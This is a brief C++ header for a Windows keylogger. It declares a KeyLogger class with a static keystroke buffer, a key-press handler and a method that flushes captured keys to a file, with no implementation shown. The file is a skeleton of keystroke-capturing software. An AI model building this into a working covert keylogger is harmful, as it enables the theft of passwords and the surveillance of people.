// KeyLogger.hpp
#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include "Types.hpp"
#include "Logger.hpp"
#include <fstream>

class KeyLogger {
    private:
        int flushBufferSize = 10;
    public:
        KeyLogger(){}
        static inline std::string keyBuffer;
        void onKeyPress(std::string str);
        void flushBufferToFile();
};